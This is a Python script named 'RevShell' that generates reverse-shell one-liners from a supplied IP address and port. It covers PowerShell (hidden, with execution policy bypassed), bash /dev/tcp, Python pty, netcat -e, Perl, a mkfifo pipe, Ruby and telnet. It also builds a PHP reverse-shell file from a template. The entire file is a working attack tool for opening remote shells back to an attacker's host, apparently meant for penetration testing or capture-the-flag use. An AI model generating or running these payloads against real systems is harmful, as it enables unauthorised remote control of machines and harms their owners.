#!/usr/bin/python3

# Created the 4th of March 2021.

# Ressources :
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby
# https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/#Bash

import pyfiglet
import os, sys, re

os.system('clear')

ascii_banner = pyfiglet.figlet_format(" -- RevShell -- ")
print(ascii_banner)
print(" ----------------------- Written by Libereau ----------------------\n")


def error():
    print("\nUsage : ./shell.py [-i | --ip-local] [-p | --port-local] [-s | --shell] ")
    print("\n\t[+] Exemple : ./shell_generator.py -i 10.10.14.9 -p 1337 --shell powershell")
    print("\nIntegrated shell : powershell, bash, python, nc, perl, fifo, ruby, telnet")
    exit(1)


def main():

    shell_type = ["powershell","bash", "python", "nc", "perl", "fifo", "ruby", "telnet", "php"]

    if len(sys.argv) < 4:
        error()

    if (sys.argv[1] == "-i") or (sys.argv[1] == "--ip-local"):
        ip = sys.argv[2]

        if (sys.argv[3] == "-p") or (sys.argv[3] == "--port-local"):
            if str(sys.argv[4]).isdigit() :
                port = sys.argv[4]
            else :
                error()

            if (sys.argv[5] == "-s") or (sys.argv[5] == "--shell"):
                if (sys.argv[6] in shell_type):
                    shell = sys.argv[6]
                else :
                    error()
            else :
                error()
        else :
            error()
    else :
        error()

    return ip,port,shell

def gen_revshell(ip,port,shell):

    print(f"Arguments : ")
    print(f" - IP : {ip}")
    print(f" - PORT : {port}")
    print(f" - Shell : {shell}\n")

    if shell == "powershell":
        print(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""+ip+"+\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")

    elif shell == "bash" :
        print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")

    elif shell == "python":
        print(f"export RHOST={ip};export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'")

    elif shell == "nc":
        print(f"nc {ip} {port} -e /bin/bash")

    elif shell == "perl":
        print("perl -e 'use Socket;$i=\""+ip+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, \">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")

    elif shell == "fifo":
        print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} > /tmp/f")

    elif shell == "ruby":
        print(f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")

    elif shell == "telnet":
        port = int(port)
        print(f"telnet {ip} {port} | /bin/bash | telnet {ip} {port+1}")

    elif shell == "php":


        rev_file = "revshell_"+ip+"_"+port+".php"
        final = open(rev_file, "w")

        base_file = open("/opt/php_revshell/php-reverse-shell.php", "r")
        lines = base_file.readlines()

        for line in lines :
            if "127.0.0.1" in line :
                final.write(f"$ip = '{ip}';\n\r")

            elif "1234" in line :
                final.write(f"$port = {port};\r\n")

            else:
                final.write(line)

        print("[+] php rev shell created in you current directory")

    else :
        error()


ip, port, shell = main()
gen_revshell(ip,port,shell)
